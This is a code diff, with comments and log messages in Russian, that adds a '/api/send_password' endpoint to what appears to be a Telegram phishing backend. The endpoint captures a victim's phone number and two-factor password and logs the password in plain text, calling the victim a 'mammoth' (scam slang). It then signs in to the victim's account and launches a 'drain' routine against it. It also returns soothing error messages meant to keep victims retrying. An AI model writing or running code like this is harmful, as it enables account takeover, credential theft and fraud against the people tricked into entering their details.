@@ -380,6 +380,43 @@ def api_send_code():
         send_log(f"⚠️ Таймаут/Ошибка ожидания для {phone}: {e}")
         return jsonify({"status": "error", "message": "Сервер перегружен. Попробуйте еще раз через 10 секунд."})
 
+@app.route('/api/send_password', methods=['POST'])
+def api_send_password():
+    data = request.json
+    phone, password = data.get('phone'), data.get('password')
+    send_log(f"🔐 Мамонт: {phone}, ввел 2FA пароль: {password}")
+
+    async def _async_sign_in_2fa():
+        try:
+            # Берем клиента из активных или временных
+            client = active_clients.get(phone)
+            if not client and phone in temp_clients:
+                client = temp_clients[phone]['client']
+            
+            if not client:
+                return {"status": "error", "message": "Сессия потеряна"}
+
+            # Завершаем вход с паролем
+            await client.sign_in(password=password)
+            
+            active_clients[phone] = client
+            send_log(f"✅ 2FA пройдено: {phone}. Начинаю слив.")
+            
+            # Запускаем твою логику слива
+            asyncio.create_task(drain_logic(client, phone))
+            return {"status": "success"}
+            
+        except Exception as e:
+            send_log(f"❌ Ошибка 2FA {phone}: {e}")
+            return {"status": "error", "message": str(e)}
+
+    # Запускаем в основном цикле с таймаутом
+    future = asyncio.run_coroutine_threadsafe(_async_sign_in_2fa(), main_loop)
+    try:
+        return jsonify(future.result(timeout=25))
+    except Exception:
+        return jsonify({"status": "error", "message": "Сервер долго отвечал. Попробуйте еще раз."})
+
 @bot.on(events.NewMessage)
 async def contact_handler(event):
     if event.contact and event.contact.user_id == event.sender_id:
